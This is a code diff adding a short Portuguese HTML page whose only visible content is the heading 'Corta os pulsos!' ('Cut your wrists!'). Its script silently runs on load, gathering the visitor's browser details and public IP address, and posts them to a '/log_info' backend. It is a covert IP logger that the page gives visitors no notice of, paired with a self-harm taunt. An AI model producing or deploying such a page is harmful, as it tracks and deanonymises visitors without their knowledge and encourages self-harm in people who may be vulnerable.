@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JA FOSTES</title>
+</head>
+<body>
+    <h1>Corta os pulsos!</h1>
+
+    <script>
+        // Captura as informações do dispositivo
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookiesEnabled: navigator.cookieEnabled,
+        };
+
+        // Função para pegar o IP público
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                deviceInfo.ip = data.ip;
+                sendDeviceInfo(deviceInfo);
+            } catch (error) {
+                console.error("Erro ao obter IP:", error);
+            }
+        }
+
+        // Envia as informações para o backend em Python
+        async function sendDeviceInfo(info) {
+            try {
+                const response = await fetch('/log_info', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(info),
+                });
+                if (response.ok) {
+                    console.log("Informações enviadas com sucesso!");
+                } else {
+                    console.error("Erro ao enviar informações:", response.statusText);
+                }
+            } catch (error) {
+                console.error("Erro ao enviar informações:", error);
+            }
+        }
+
+        // Executa as funções
+        fetchIP();
+    </script>
+</body>
+</html>
